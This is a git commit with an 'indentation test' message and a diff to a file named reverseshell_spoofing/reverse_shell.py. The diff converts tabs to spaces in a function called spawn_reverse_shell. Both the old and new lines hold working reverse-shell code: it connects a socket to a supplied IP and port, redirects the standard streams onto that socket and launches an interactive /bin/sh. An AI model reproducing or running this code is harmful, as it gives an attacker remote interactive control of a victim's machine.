6f112cd221cd817a124b70818e1495c3bb33394c
kdpkst <jammiechen0@gmail.com>
2023-10-22 22:40:11 +0800

    indentation test

--- reverseshell_spoofing/reverse_shell.py
+++ reverseshell_spoofing/reverse_shell.py
@@ -4,12 +4,12 @@ import subprocess
 import argparse
 
 def spawn_reverse_shell(ip, port):
-	shell_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-	shell_socket.connect((ip, int(port)))
-	os.dup2(shell_socket.fileno(),0)
-	os.dup2(shell_socket.fileno(),1)
-	os.dup2(shell_socket.fileno(),2)
-	subprocess.call(['/bin/sh','-i'])
+    shell_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    shell_socket.connect((ip, int(port)))
+    os.dup2(shell_socket.fileno(),0)
+    os.dup2(shell_socket.fileno(),1)
+    os.dup2(shell_socket.fileno(),2)
+    subprocess.call(['/bin/sh','-i'])
 	
 	
 def argument_parser():
